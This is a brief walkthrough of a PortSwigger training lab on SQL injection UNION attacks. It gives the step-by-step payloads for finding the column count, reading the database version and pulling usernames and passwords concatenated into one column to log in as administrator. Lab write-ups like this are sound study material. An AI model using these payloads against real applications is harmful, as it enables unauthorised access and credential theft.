**Lab:** SQL injection UNION attack, retrieving multiple values in a single column

**Vulnerability:** basic sql union queries

**Vulnerable Parameter:** category (GET request)

**Technique:** UNION attack with basic queries

**URL:** https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column
## Steps:
1. Find category parameter
2. Open Burp Suite and send request to Repeater
3. Test with `'` → Internal Server Error
4. Comment out with `--` → worked
5. Find column count: `' ORDER BY 2--` works, `' ORDER BY 3--` fails  → (2 columns)
6. ' UNION SELECT 'A', NULL--  fails
7. ' UNION SELECT NULL, 'A'--  → worked (only second column accepts string)
8. ' UNION SELECT NULL, version()-- → worked (PostgreSQL database)
9. ' UNION SELECT NULL, USERNAME||PASSWORD FROM USERS-- → worked but they are next to each other hard to read
10.  ' UNION SELECT NULL, USERNAME||'***'||PASSWORD FROM USERS-- → Observe the responce you got username and password for the administrator log in with these credentials
11. Lab solved
## Notes:
The data base version you will have to test each query to get the correct version
The username and password and users database got them from the lab description
The string concatenation query got them from sql injection cheatsheet provided by port swigger
